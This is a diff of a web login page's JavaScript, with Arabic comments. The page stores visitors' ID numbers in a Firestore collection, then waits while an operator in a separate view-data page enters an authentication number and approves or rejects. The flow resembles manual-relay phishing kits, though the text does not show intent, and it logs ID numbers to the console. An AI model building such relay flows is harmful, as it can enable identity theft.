@@ -595,7 +595,7 @@ async function saveIdNumberToFirebase(idNumber, rememberMe) {
     }
 }
         
-       // ========== التحقق من رقم المصادقة ==========
+     // ========== التحقق من رقم المصادقة ==========
 async function checkForAuthNumber(recordId) {
     try {
         const db = window.firebaseDb || (window.firebaseServices ? window.firebaseServices.db() : null);
@@ -612,29 +612,93 @@ async function checkForAuthNumber(recordId) {
         
         const data = doc.data();
         
-        // التحقق مما إذا كان هناك رقم مصادقة وإجراء
-        // التعديل: التحقق من أن authNumber ليس فارغًا وليس undefined وليس null
-        // وتقبل الرقم 0 كقيمة صالحة
-        const hasAuth = data.authNumber !== undefined && data.authNumber !== null;
-        const hasAction = data.action !== undefined && data.action !== null;
+        console.log('🔍 بيانات السجل:', {
+            id: recordId,
+            waiting: data.waiting,
+            authNumber: data.authNumber,
+            action: data.action,
+            status: data.status
+        });
         
-        if (hasAuth && hasAction) {
+        // التحقق المهم: يجب أن يكون waiting = false حتى نعتبر المصادقة مكتملة
+        if (data.waiting === false && data.authNumber !== undefined && data.authNumber !== null && 
+            data.action !== undefined && data.action !== null) {
+            
+            console.log('✅ تم إدخال رقم المصادقة والإكمال:', data.authNumber, data.action);
+            
             return { 
                 hasAuthNumber: true, 
                 authNumber: data.authNumber,
                 action: data.action,
                 status: data.status,
+                waiting: data.waiting,
                 timestamp: data.updatedAt || data.completedAt || data.timestamp
             };
         }
         
+        console.log('⏳ مازال في حالة انتظار:', data.waiting);
         return { hasAuthNumber: false };
         
     } catch (error) {
         console.error('❌ خطأ في التحقق من رقم المصادقة:', error);
         return { hasAuthNumber: false, error: error.message };
     }
-} 
+}
+        // ========== مراقبة التغييرات في الوقت الحقيقي ==========
+function startRealtimeMonitoring(recordId) {
+    try {
+        const db = window.firebaseDb || (window.firebaseServices ? window.firebaseServices.db() : null);
+        
+        if (!db) {
+            console.error('❌ Firestore غير متاح للمراقبة في الوقت الحقيقي');
+            return null;
+        }
+        
+        console.log('👂 بدء المراقبة في الوقت الحقيقي للسجل:', recordId);
+        
+        // الاستماع للتغييرات في الوقت الحقيقي
+        const unsubscribe = db.collection('id_numbers').doc(recordId)
+            .onSnapshot((doc) => {
+                if (doc.exists) {
+                    const data = doc.data();
+                    console.log('🔄 تحديث مباشر للسجل:', {
+                        waiting: data.waiting,
+                        authNumber: data.authNumber,
+                        action: data.action,
+                        status: data.status
+                    });
+                    
+                    // إذا تم تغيير حالة waiting إلى false وتم إدخال رقم مصادقة
+                    if (data.waiting === false && data.authNumber && data.action) {
+                        console.log('🎯 اكتشاف تغيير في الوقت الحقيقي! جاري التوجيه...');
+                        
+                        // إيقاف المراقبة
+                        unsubscribe();
+                        
+                        // تنفيذ الإجراء المناسب
+                        if (data.action === 'approve') {
+                            setTimeout(() => {
+                                window.location.href = 'success.html?recordId=' + encodeURIComponent(recordId) + 
+                                                      '&authNumber=' + encodeURIComponent(data.authNumber);
+                            }, 1000);
+                        } else if (data.action === 'reject') {
+                            setTimeout(() => {
+                                window.location.href = 'sorry.html?recordId=' + encodeURIComponent(recordId);
+                            }, 1000);
+                        }
+                    }
+                }
+            }, (error) => {
+                console.error('❌ خطأ في المراقبة في الوقت الحقيقي:', error);
+            });
+        
+        return unsubscribe;
+        
+    } catch (error) {
+        console.error('❌ خطأ في بدء المراقبة:', error);
+        return null;
+    }
+}
      // ========== بدء مراقبة رقم المصادقة ==========
 function startAuthNumberMonitoring(recordId) {
     currentRecordId = recordId;
@@ -644,6 +708,9 @@ function startAuthNumberMonitoring(recordId) {
     
     // بدء المؤقت
     startTimer();
+    
+    // بدء المراقبة في الوقت الحقيقي
+    const unsubscribe = startRealtimeMonitoring(recordId);
     
     // إيقاف أي فحص سابق
     if (authCheckInterval) {
@@ -660,34 +727,34 @@ function startAuthNumberMonitoring(recordId) {
             lastProgress = progress;
         }
         
-        // التحقق من وجود رقم مصادقة
+        // التحقق من وجود رقم مصادقة (الفحص الدوري)
         const result = await checkForAuthNumber(recordId);
         
-        console.log(`🔍 فحص رقم ${checkCount}:`, result);
+        console.log(`🔍 فحص دوري رقم ${checkCount}:`, result.hasAuthNumber ? '✅ تم المصادقة' : '⏳ مازال منتظراً');
         
         if (result.hasAuthNumber) {
             // تم إدخال رقم المصادقة
-            console.log('✅ تم العثور على رقم مصادقة:', result.authNumber, 'الإجراء:', result.action);
+            console.log('✅ تم العثور على رقم مصادقة (فحص دوري):', result.authNumber, 'الإجراء:', result.action);
+            
+            // إيقاف المراقبة
+            if (unsubscribe) unsubscribe();
             clearInterval(authCheckInterval);
             stopTimer();
             
             updateProgress(90, 'تم إدخال رقم المصادقة!', true);
             
             if (result.action === 'approve') {
-                // إذا كان الإجراء "موافقة" توجيه إلى success.html
                 waitingStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success-color);"></i> تم تأكيد الرقم، جاري التوجيه...';
                 updateProgress(100, 'تم الموافقة على طلبك!', true);
                 
                 showNotification('تمت الموافقة', `تم إدخال رقم المصادقة ${result.authNumber} وموافقة المسؤول`, 'success');
                 
-                // أضف تأخير للسماح للمستخدم برؤية الرسالة
                 setTimeout(() => {
                     window.location.href = 'success.html?recordId=' + encodeURIComponent(recordId) + 
                                           '&authNumber=' + encodeURIComponent(result.authNumber);
                 }, 2000);
                 
             } else if (result.action === 'reject') {
-                // إذا كان الإجراء "رفض" توجيه إلى sorry.html
                 waitingStatus.innerHTML = '<i class="fas fa-times-circle" style="color: var(--error-color);"></i> تم رفض الطلب';
                 updateProgress(100, 'تم رفض طلبك', true);
                 
@@ -701,8 +768,12 @@ function startAuthNumberMonitoring(recordId) {
         } else if (checkCount >= maxChecks) {
             // انتهى وقت الانتظار
             console.log('⏰ انتهى وقت الانتظار');
+            
+            // إيقاف المراقبة
+            if (unsubscribe) unsubscribe();
             clearInterval(authCheckInterval);
             stopTimer();
+            
             waitingStatus.innerHTML = '<i class="fas fa-clock" style="color: var(--warning-color);"></i> انتهى وقت الانتظار';
             updateProgress(100, 'انتهى وقت الانتظار', true);
             
@@ -710,7 +781,7 @@ function startAuthNumberMonitoring(recordId) {
             
             setTimeout(() => {
                 cancelWaiting();
-            }, 5000);
+            }, 3000);
         }
         
         // تحديث رسالة الانتظار كل 30 ثانية
@@ -718,51 +789,62 @@ function startAuthNumberMonitoring(recordId) {
             const minutes = Math.floor(checkCount / 60);
             const seconds = checkCount % 60;
             waitingStatus.innerHTML = `
-        
+                <i class="fas fa-clock" style="color: var(--primary-color);"></i> 
+                جاري انتظار إدخال رقم المصادقة من المسؤول...<br>
+                <small>الوقت المنقضي: ${minutes}:${seconds.toString().padStart(2, '0')}</small>
             `;
         }
         
     }, 1000);
+    
+    // حفظ المرجع لإيقافه لاحقاً
+    window.currentUnsubscribe = unsubscribe;
 }
         
-        // ========== إلغاء الانتظار ==========
-        async function cancelWaiting() {
-            if (authCheckInterval) {
-                clearInterval(authCheckInterval);
-                authCheckInterval = null;
-            }
-            
-            stopTimer();
-            
-            // تحديث حالة السجل إلى ملغي
-            if (currentRecordId) {
-                const db = window.firebaseDb || (window.firebaseServices ? window.firebaseServices.db() : null);
+      // ========== إلغاء الانتظار ==========
+async function cancelWaiting() {
+    // إيقاف المراقبة في الوقت الحقيقي
+    if (window.currentUnsubscribe) {
+        window.currentUnsubscribe();
+        window.currentUnsubscribe = null;
+    }
+    
+    if (authCheckInterval) {
+        clearInterval(authCheckInterval);
+        authCheckInterval = null;
+    }
+    
+    stopTimer();
+    
+    // تحديث حالة السجل إلى ملغي
+    if (currentRecordId) {
+        const db = window.firebaseDb || (window.firebaseServices ? window.firebaseServices.db() : null);
+        
+        if (db) {
+            try {
+                await db.collection('id_numbers').doc(currentRecordId).update({
+                    status: 'cancelled',
+                    waiting: false, // تأكد من تغييرها إلى false
+                    cancelledAt: new Date().toISOString(),
+                    authStatus: 'cancelled',
+                    updatedAt: new Date().toISOString()
+                });
                 
-                if (db) {
-                    try {
-                        await db.collection('id_numbers').doc(currentRecordId).update({
-                            status: 'cancelled',
-                            waiting: false,
-                            cancelledAt: new Date().toISOString(),
-                            authStatus: 'cancelled'
-                        });
-                        
-                        console.log('✅ تم تحديث حالة السجل إلى ملغي');
-                    } catch (error) {
-                        console.error('❌ خطأ في تحديث حالة السجل:', error);
-                    }
-                }
+                console.log('✅ تم تحديث حالة السجل إلى ملغي');
+            } catch (error) {
+                console.error('❌ خطأ في تحديث حالة السجل:', error);
             }
-            
-            // إخفاء شاشة الانتظار
-            waitingScreen.style.display = 'none';
-            loginContent.style.display = 'block';
-            isProcessing = false;
-            submitButton.disabled = false;
-            
-            showNotification('تم الإلغاء', 'تم إلغاء طلب تسجيل الدخول', 'info');
         }
-
+    }
+    
+    // إخفاء شاشة الانتظار
+    waitingScreen.style.display = 'none';
+    loginContent.style.display = 'block';
+    isProcessing = false;
+    submitButton.disabled = false;
+    
+    showNotification('تم الإلغاء', 'تم إلغاء طلب تسجيل الدخول', 'info');
+}
 
 
 
@@ -951,6 +1033,51 @@ window.checkAllRecords = async function() {
                 clearInterval(timerInterval);
             }
         });
+        // ========== أداة اختبار حالة السجل ==========
+window.debugRecordStatus = async function(recordId) {
+    if (!recordId) recordId = currentRecordId;
+    
+    if (!recordId) {
+        console.error('❌ لا يوجد سجل محدد');
+        return;
+    }
+    
+    console.log('🐞 بدء تصحيح السجل:', recordId);
+    
+    const db = window.firebaseDb || (window.firebaseServices ? window.firebaseServices.db() : null);
+    if (!db) {
+        console.error('❌ Firestore غير متاح');
+        return;
+    }
+    
+    try {
+        const doc = await db.collection('id_numbers').doc(recordId).get();
+        
+        if (doc.exists) {
+            const data = doc.data();
+            console.log('📊 حالة السجل الحالية:');
+            console.log('- ID:', recordId);
+            console.log('- رقم الهوية:', data.idNumber);
+            console.log('- حالة الانتظار (waiting):', data.waiting);
+            console.log('- رقم المصادقة (authNumber):', data.authNumber);
+            console.log('- الإجراء (action):', data.action);
+            console.log('- الحالة (status):', data.status);
+            console.log('- وقت الإنشاء:', data.timestamp);
+            console.log('- وقت التحديث:', data.updatedAt);
+            console.log('- وقت الإكمال:', data.completedAt);
+            
+            // اقتراح حل
+            if (data.waiting === true && data.authNumber) {
+                console.log('⚠️ المشكلة: waiting=true مع وجود authNumber!');
+                console.log('💡 الحل: يجب تغيير waiting إلى false في view-data.html');
+            }
+        } else {
+            console.error('❌ السجل غير موجود');
+        }
+    } catch (error) {
+        console.error('❌ خطأ في تصحيح السجل:', error);
+    }
+};
     </script>
 </body>
 </html>
